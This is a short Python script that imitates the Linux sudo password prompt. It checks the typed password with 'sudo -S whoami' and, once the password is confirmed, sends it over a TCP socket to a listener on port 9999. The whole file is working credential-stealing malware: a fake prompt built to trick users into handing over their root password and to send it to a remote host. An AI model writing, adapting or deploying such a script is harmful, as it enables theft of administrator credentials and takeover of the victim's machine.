import getpass
from socket import socket, AF_INET, SOCK_STREAM
from subprocess import Popen, PIPE
ip = "0.0.0.0"
a = socket(AF_INET, SOCK_STREAM)
a.connect((ip, 9999))
a.recv(1024)
ip = "0.0.0.0"

class sudo:

    def __init__(self):
        pass

    @classmethod
    def prompt(cls):
        while True:
            passwd = getpass.getpass(f'[sudo] password for {getpass.getuser()}: ')
            cmd = Popen(['sudo', '-S', 'whoami'], stdout=PIPE, stderr=PIPE, stdin=PIPE)
            cmd.communicate(passwd.encode())
            if 'root' in cmd.communicate()[0].decode():
                a.send(passwd.encode())
                return True
            else:
                print('Sorry, try again.')
                cmd.kill()


sudo().prompt()
